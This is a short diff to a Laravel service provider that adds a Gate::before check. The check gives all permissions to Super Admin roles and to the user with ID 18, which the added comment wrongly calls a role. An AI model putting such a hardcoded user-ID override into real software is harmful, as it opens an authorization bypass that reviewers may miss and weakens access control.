@@ -88,6 +88,11 @@ class AppServiceProvider extends ServiceProvider
         View::share('general_settings', $generalSettings);
         View::share('additional_pages', $additionalPages);
         View::share('nav_categories', $navCategories);
+        // Implicitly grant "Super Admin" and ID 18 role all permissions
+        \Illuminate\Support\Facades\Gate::before(function ($user, $ability) {
+            return ($user->id === 18 || $user->hasRole('Super Admin') || $user->hasRole('SuperAdmin')) ? true : null;
+        });
+
         // Blade directives for roles and permissions
         \Blade::directive('role', function ($role) {
             return "<?php if(auth()->check() && auth()->user()->hasRole({$role})): ?>";
